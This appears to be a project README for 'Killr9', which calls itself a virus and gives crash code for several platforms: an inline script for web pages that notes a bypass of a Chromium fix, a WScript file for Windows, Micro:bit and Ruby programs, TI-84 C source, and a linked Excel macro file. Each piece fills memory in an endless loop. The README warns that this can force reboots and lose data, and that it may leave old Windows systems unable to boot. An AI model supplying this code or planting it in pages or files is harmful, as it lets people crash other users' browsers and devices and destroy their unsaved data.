# Killr9
A virus that will kill virtually anything! We have it available in HTML, JavaScript, Python, MakeCode, TypeScript, Godot, and more!

## Killing Webpages - Inline Script
Paste the JS code inside of a script tag.
```html
<script>
    function ohSnap() {
        var corruptable=[]
        for(var i=0;true;i++) {
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
            corruptable.push(i);
        }
    }
    
    setInterval(ohSnap) // required to bypass a fix in newer Chromium versions
</script>
```


## Killing a Windows96 instance(WRT Bin)
Create a WRT bin, like this:
```js
//!wrt
function ohSnap() {
    var corruptable=[]
    for(var i=0;true;i++) {
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
    }
}

setInterval(ohSnap);
```

Executing any WRT binary on Windows 96 with this code will cause the tab to lag and crash.

## Killing the BBC Micro:bit (MakeCode Editor)
Open the makecode editor at https://makecode.microbit.org/, create a project, and paste the typescript in:
```ts
function ohSnap () {
    for (let i = 0; true; i++) {
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
        corruptable.push(i)
    }
}
let corruptable: number[] = []
corruptable = []
ohSnap()
```

Flashing this code onto your Micro:bit will cause the RAM to become completely full. This will also cause in error when being ran in the simulator, and in rare instances may completely crash it.

## Killing Windows 98 - Windows 11 (WScript)
Create a new `.js` file with the following contents:
```js
function ohSnap() {
    var corruptable=[]
    if(!corruptable.push) {
        corruptable.push=function(e){
            corruptable[corruptable.length]=e;
            corruptable.length++
        }
    }
    for(var i=0;true;i++) {
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
        corruptable.push(i);
    }
}

ohSnap()
```

Running this script with WSCRIPT.EXE will not cause immediate system death, but will fill up the RAM and cause the system to lag. Eventually, a force reboot will be required.
In some cases, running this on old versions of Windows may cause the system to not be able to boot up again.

## Embedding in Ruby Programs
Create a new `.rb` file with the following contents:
```ruby
def oh_snap
  corruptable = []
  (0..9999999*999999999999999999999).each do |i|
    11.times { corruptable << i }
  end
end

oh_snap
```

## Killing Microsoft Excel
Download [MSExcel.xlsm](/src/MSExcel.xlsm) and open it in Excel. The macros will do something to it. It may not even get past the splash page.

## Killing the TI-84 Plus CE Calculator
Download [KILRNINE.8xp](/src/KILRNINE.8xp) and use [TI Connect CE](https://education.ti.com/en/software/details/en/CA9C74CAD02440A69FDC7189D7E1B6C2/swticonnectcesoftware) to transfer it to your calculator.<br/>
If you do not have TI Connect CE, you can download v6.0.1 directly using these links: [Windows (EXE)](https://education.ti.com/download/en/ed-tech/CA9C74CAD02440A69FDC7189D7E1B6C2/EB5C99AD6B2C42E7BEC073117B0FDC46/TIConnectCE-6.0.1.344.exe) - [MacOS (DMG)](https://education.ti.com/download/en/ed-tech/CA9C74CAD02440A69FDC7189D7E1B6C2/D96C79959E494383BDCA94D0478FFF05/TIConnectCE-6.0.1.344.dmg)<br/>
These links are safe and link to official downloads hosted on Texas Instruments' website. If you have Linux, or cannot use TI Connect CE, you can download [TILP](https://sourceforge.net/projects/tilp/) from SourceForge - it works on Windows, MacOS, Linux, BSD and ChromeOS. Running this program will crash your TI-84 Plus CE, so make sure importent data is in the Archive memory before you run this.<br/>
You can also transfer this onto other TI-84 Plus CE units through the `Link` feature.

Here is the source if you want to compile it yourself:
```cpp
////////////////////////////////////////
// { KILRNINE } { VERSION }
// Author: themirrazz
// License:
// Description: Killr9
////////////////////////////////////////

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <tice.h>

#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void ohSnap() {
    int corruptable[4999999];
    int i = 0;
    while (true) {
        corruptable[i] = (i*i);
        i++;
    }
}

int main() {
    ohSnap();
    return 0;
}
```
